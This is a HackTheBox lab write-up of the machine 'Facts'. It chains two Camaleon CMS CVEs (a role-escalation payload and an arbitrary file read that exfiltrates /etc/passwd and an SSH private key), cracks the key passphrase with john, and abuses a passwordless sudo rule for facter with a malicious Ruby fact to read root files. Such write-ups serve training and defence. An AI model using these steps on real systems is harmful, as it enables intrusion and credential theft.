# Penetration Test Report — HTB Machine: Facts

**Assessment Date:** April 8, 2026
**Tester:** SanskariWolf
**Target Host:** `facts.htb` (`10.129.19.209`)
**Platform:** HackTheBox
**Difficulty:** Easy (Linux)
**Status:** Fully Compromised (User + Root flags captured)

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Pre-requisites](#2-scope--pre-requisites)
3. [Findings Summary](#3-findings-summary)
4. [Reconnaissance](#4-reconnaissance)
   - 4.1 [Port & Service Enumeration](#41-port--service-enumeration)
   - 4.2 [Web Application Fingerprinting](#42-web-application-fingerprinting)
5. [Exploitation](#5-exploitation)
   - 5.1 [CVE-2025-2304 — Privilege Escalation via Mass Assignment](#51-cve-2025-2304--privilege-escalation-via-mass-assignment)
   - 5.2 [CVE-2024-46987 — Authenticated Arbitrary File Read](#52-cve-2024-46987--authenticated-arbitrary-file-read)
6. [Post-Exploitation — User Access](#6-post-exploitation--user-access)
   - 6.1 [Extracting SSH Private Key & Cracking Passphrase](#61-extracting-ssh-private-key--cracking-passphrase)
   - 6.2 [SSH Login as `trivia`](#62-ssh-login-as-trivia)
7. [Privilege Escalation — Root Access](#7-privilege-escalation--root-access)
   - 7.1 [Sudo Enumeration](#71-sudo-enumeration)
   - 7.2 [Abusing `/usr/bin/facter` with Custom Ruby Fact](#72-abusing-usrbinfacter-with-custom-ruby-fact)
8. [Flags Captured](#8-flags-captured)
9. [Recommendations](#9-recommendations)

---

## 1. Executive Summary

During this assessment, the target host `facts.htb` was fully compromised, yielding both the **user flag** and the **root flag**. The attack chain involved:

1. Identifying a **Camaleon CMS v2.9.0** installation running on port 80.
2. Registering a low-privilege account and exploiting **CVE-2025-2304** (mass assignment vulnerability) to escalate CMS privileges from **Client → Administrator**.
3. Leveraging the newly gained admin access to exploit **CVE-2024-46987** (arbitrary file read) to exfiltrate sensitive files — including `/etc/passwd`, the user flag, and the `trivia` user's **SSH private key**.
4. Cracking the passphrase-protected private key using `john` and the `rockyou-70.txt` wordlist, recovering the passphrase `dragonballz`.
5. Logging in via SSH as `trivia` and abusing a **passwordless `sudo` rule** for `/usr/bin/facter` to read `/root/root.txt` through a malicious custom Ruby fact — achieving root-level file read without a full shell.

---

## 2. Scope & Pre-requisites

| Item | Detail |
|---|---|
| Target IP | `10.129.19.209` |
| Hostname | `facts.htb` |
| Operating System | Ubuntu 25.04 (Linux Kernel 6.14.0-37-generic) |
| Attack machine IP | `10.10.14.247` (HTB VPN `tun0`) |

**HTB Flag Convention:**
- User flag: `user.txt` — located in a user's home directory (found at `/home/william/user.txt`)
- Root flag: `root.txt` — located at `/root/root.txt`

> **Note — VPN Connectivity Issue:** Early in the assessment, HTTP requests to `facts.htb` were silently dropped despite the host being reachable via ICMP. This was traced to **MTU fragmentation** on the VPN tunnel. Setting a lower MTU resolved the issue:
> ```bash
> sudo ip link set dev tun0 mtu 1200
> ```

---

## 3. Findings Summary

| # | Vulnerability | CVE | Severity | Impact |
|---|---|---|---|---|
| 1 | Camaleon CMS Mass Assignment — Privilege Escalation | CVE-2025-2304 | **High** | Client role escalated to Administrator |
| 2 | Camaleon CMS Authenticated Arbitrary File Read | CVE-2024-46987 | **High** | Read arbitrary files from the server filesystem |
| 3 | Weak SSH Key Passphrase | — | **Medium** | Private key passphrase cracked in ~33 seconds |
| 4 | Insecure Sudo Rule — `/usr/bin/facter` NOPASSWD | — | **Critical** | Root-level arbitrary file read via custom fact |

---

## 4. Reconnaissance

### 4.1 Port & Service Enumeration

An initial fast TCP scan revealed two open ports:

```
$ nmap 10.129.19.209
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

A detailed service version scan confirmed the following:

```
$ nmap -sC -sV -p- --min-rate 5000 10.129.19.209

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx/1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Observations:**
- **SSH (port 22):** OpenSSH 9.9p1 — no publicly known critical vulnerabilities. Requires valid credentials; brute-force was deprioritised.
- **HTTP (port 80):** nginx/1.26.3 reverse-proxying a web application. The server immediately redirects IP-based requests to `http://facts.htb/`, requiring a `/etc/hosts` entry.

**Host configuration:**
```
/etc/hosts entry added: 10.129.19.209  facts.htb
```

### 4.2 Web Application Fingerprinting

Nikto identified missing security headers on the web server:

```
$ nikto -h 10.129.19.209

+ Server: nginx/1.26.3 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ Root page / redirects to: http://facts.htb/
```

Browsing to `http://facts.htb/` presented a trivia/facts blog website. Inspection of the page source and HTTP response headers (particularly `set-cookie: _factsapp_session=...`) revealed the application was built with **Ruby on Rails**. The footer identified the CMS as **Camaleon CMS**.

Manual browsing of well-known paths uncovered an admin portal at `/admin`. URL fuzzing with SecLists would also have revealed this path.

- `/robots.txt` — does not exist
- `/sitemap.xml` — exists; maps all published blog posts
- `/admin` — **admin login portal accessible** (no authentication required to view the login page)

After registering a user account at `/admin`, the session was granted **Client** role privileges — insufficient to access administrative functionality.

The application version was visible in the footer: **Camaleon CMS 2.9.0**.

A search for known vulnerabilities revealed **two critical CVEs** affecting this version:

| CVE | Type | Affected Version |
|---|---|---|
| CVE-2025-2304 | Mass Assignment — Privilege Escalation | < 2.9.1 |
| CVE-2024-46987 | Authenticated Arbitrary File Read | < 2.9.1 |

---

## 5. Exploitation

### 5.1 CVE-2025-2304 — Privilege Escalation via Mass Assignment

**Description:** Camaleon CMS versions prior to 2.9.1 expose a user update AJAX endpoint (`/admin/users/<id>/updated_ajax`) that fails to restrict which parameters a user may update. By submitting the `password[role]` parameter with the value `admin`, a low-privilege authenticated user can escalate their own role to Administrator without knowing any administrator credentials.

**Tool Used:** Custom PoC script (`main.py`) based on the public PoC by `d3vn0mi`.

> **Note:** The PoC was written manually after the GitHub HTML page was mistakenly downloaded instead of the raw Python file. Attempting `wget` on the GitHub blob URL returns an HTML page, not the raw script.

**Exploitation:**
```bash
$ python3 main.py http://facts.htb/ -u SanskariWolf -p Wolf@0304

[*] Logging in as SanskariWolf...
[+] Successfully logged in

[*] Detected version: 2.9.0
[+] Version is VULNERABLE (< 2.9.1)

[+] EXPLOITATION SUCCESSFUL!
[+] Privilege Escalation: Client → Administrator
[+] Vulnerable Endpoint: /admin/users/5/updated_ajax
[+] Working Payload: {'password[role]': 'admin'}
[+] CVE-2025-2304 CONFIRMED!
```

**Result:** The attacker's account (`SanskariWolf`, user ID 5) was escalated from **Client** to **Administrator** role. The user's password remained unchanged.

---

### 5.2 CVE-2024-46987 — Authenticated Arbitrary File Read

**Description:** Camaleon CMS versions prior to 2.9.1 allow an authenticated administrator to read arbitrary files from the server filesystem through an authenticated endpoint. This was exploited with a custom PoC script (`main01.py`).

**Exploitation — `/etc/passwd`:**
```bash
$ python3 main01.py -u http://facts.htb/ -l SanskariWolf -p Wolf@0304 /etc/passwd

root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
...
```

This revealed two non-system user accounts on the box: `trivia` and `william`.

**Exploitation — User Flag:**
```bash
$ python3 main01.py -u http://facts.htb/ -l SanskariWolf -p Wolf@0304 /home/william/user.txt

a68a78510d675ea642487523e1b9e6d1
```

**User flag captured.**

---

## 6. Post-Exploitation — User Access

### 6.1 Extracting SSH Private Key & Cracking Passphrase

With arbitrary file read as admin, the SSH private key for the `trivia` user was exfiltrated:

```bash
$ python3 main01.py -u http://facts.htb/ -l SanskariWolf -p Wolf@0304 /home/trivia/.ssh/id_ed25519 > trivia_id_ed25519
```

The key was protected by a passphrase (AES-256-CTR, Bcrypt KDF, 24 iterations). The hash was extracted and cracked using `john`:

```bash
$ ssh2john ./trivia_id_ed25519 > trivia_id_ed25519.hash

$ john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-70.txt ./trivia_id_ed25519.hash

dragonballz      (./trivia_id_ed25519)
Session completed.
```

| Item | Value |
|---|---|
| Key type | Ed25519 |
| KDF | Bcrypt/AES |
| Iterations | 24 |
| Wordlist used | `rockyou-70.txt` |
| Time to crack | ~33 seconds |
| **Passphrase** | `dragonballz` |

### 6.2 SSH Login as `trivia`

Prior to connecting, the key file permissions were corrected:

```bash
$ chmod 600 trivia_id_ed25519
$ ssh -i trivia_id_ed25519 trivia@facts.htb
Enter passphrase for key 'trivia_id_ed25519': dragonballz

Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
trivia@facts:~$
```

**Interactive shell obtained as `trivia`.**

---

## 7. Privilege Escalation — Root Access

### 7.1 Sudo Enumeration

The first standard post-exploitation step was checking the sudo configuration for the `trivia` user:

```bash
trivia@facts:~$ sudo -l

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

The user `trivia` can run `/usr/bin/facter` as any user (including root) **without a password**.

**What is `facter`?** Facter is a system inventory tool used by Puppet. It collects and reports "facts" (system information) and supports **custom facts** written in Ruby, loaded from a user-specified directory via the `--custom-dir` flag.

**Installed version:** `4.10.0`

### 7.2 Abusing `/usr/bin/facter` with Custom Ruby Fact

Since `facter` is executed as root and supports loading arbitrary Ruby code as custom facts, a malicious fact can be crafted to read root-owned files:

**Malicious custom fact (`hello.rb`):**
```ruby
Facter.add(:hello) do
  setcode do
    File.read('/root/root.txt')
  end
end
```

**Execution:**
```bash
trivia@facts:~$ sudo /usr/bin/facter --custom-dir=. hello

90a5db81ef63c21346cbe758235918c6
```

**Root flag captured.**

> **Note:** During this phase, an alternative approach was also attempted — injecting an SSH public key into `/root/.ssh/authorized_keys` via a `system()` call in facter. While the key was successfully written, SSH login as root was blocked (likely the server disables root login or password/pubkey auth for root is restricted). The file-read approach via `File.read()` was ultimately used to capture the flag.

---

## 8. Flags Captured

| Flag | Location | Value |
|---|---|---|
| User | `/home/william/user.txt` | `a68a78510d675ea642487523e1b9e6d1` |
| Root | `/root/root.txt` | `90a5db81ef63c21346cbe758235918c6` |

---

## 9. Recommendations

| # | Finding | Recommendation |
|---|---|---|
| 1 | **CVE-2025-2304** — Mass assignment in Camaleon CMS | Upgrade Camaleon CMS to version **2.9.1 or later**. Implement server-side parameter allowlisting to reject unexpected fields on user update endpoints. |
| 2 | **CVE-2024-46987** — Authenticated arbitrary file read | Upgrade Camaleon CMS to version **2.9.1 or later**. Restrict file access operations to the application's designated asset directories through allowlist validation. |
| 3 | **Weak SSH key passphrase** | Enforce a strong passphrase policy for SSH keys. Consider using hardware-backed keys or centralised key management. |
| 4 | **Insecure sudo rule for `/usr/bin/facter`** | Remove or restrict the passwordless sudo rule. If `facter` must run with elevated privileges, use a **wrapper script** that disables custom fact loading (`--no-custom-facts --no-external-facts`) and does not accept user-supplied directories. Alternatively, run it via a restricted sudoers command that explicitly blocks the `--custom-dir` flag. |
| 5 | **Missing HTTP security headers** | Add `X-Frame-Options: DENY` (or `SAMEORIGIN`) and `X-Content-Type-Options: nosniff` headers at the nginx level. |
| 6 | **Admin portal exposed without rate-limiting** | Apply rate limiting and account lockout to `/admin` to mitigate brute-force or enumeration attempts. Consider restricting access to the admin portal by IP. |
